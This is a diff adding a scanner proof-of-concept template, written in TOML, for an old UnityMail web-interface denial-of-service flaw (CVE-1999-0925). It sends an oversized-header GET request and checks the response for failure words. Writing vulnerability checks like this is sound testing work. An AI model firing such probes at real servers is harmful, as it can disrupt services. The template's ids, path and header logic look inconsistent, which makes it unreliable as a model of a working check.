@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "UnityMail 2.0 邮件服务器管理 Web 界面在处理大量 MIME 头部时拒绝服务漏洞验证。发送包含大量自定义 MIME 头部的 HTTP 请求，观察服务器是否响应缓慢或连接被重置。"
+id = "POC-AVE-1999-0725"
+name = "CVE-1999-0925 PoC"
+severity = "medium"
+tags = ["ave-1999-0725"]
+vuln_id = [
+    "CVE-1999-0925",
+    "AVE-1999-0725",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+X-Test = "{{repeat_header}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "timeout",
+    "reset",
+    "refused",
+    "Service Unavailable",
+]
